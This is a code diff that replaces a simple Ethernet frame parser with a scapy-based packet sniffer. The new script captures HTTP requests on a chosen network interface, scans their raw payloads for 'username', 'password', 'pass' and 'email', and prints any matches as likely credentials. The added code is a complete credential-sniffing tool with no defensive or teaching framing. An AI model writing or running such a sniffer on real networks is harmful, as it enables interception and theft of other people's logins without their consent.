@@ -1,24 +1,25 @@
-import socket
-import struct
-import textwrap
+import scapy.all as scapy
+import argparse
+from scapy.layers import http
+def get_interface():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to sniff packets")
+    arguments = parser.parse_args()
+    return arguments.interface
 
+def sniff(iface):
+    scapy.sniff(iface=iface, store=False, prn=process_packet)
 
-
-def main():
-    connection = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.ntohs(3))
-    while True:
-        raw_data,addr = connection.recvfrom(65536)
-        dest_mac,src_mac,ether_type,data = unpack_ethernet(raw_data)
-        print('\n Ethernet Frame:')
-        print('Destination: {} ,Source: {},Protocol: {}'.format(dest_mac,src_mac,ether_type))
-def unpack_ethernet(data):
-    dest_mac,src_mac,ether_type = struct.unpack('! 6s 6s H',data[:14])
-    return get_mcadress(dest_mac),get_mcadress(src_mac),socket.htons(ether_type),data[:14]
-
-def get_mcadress(bytes_adress):
-    bytes_str = map('{:02x}'.format,bytes_adress)
-    return ':'.join(bytes_str).upper()
-
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keys = ["username", "password", "pass", "email"]
+            for key in keys:
+                if key in load:
+                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
 
 if __name__ == '__main__':
-    main()
+ iface = get_interface()
+ sniff(iface)
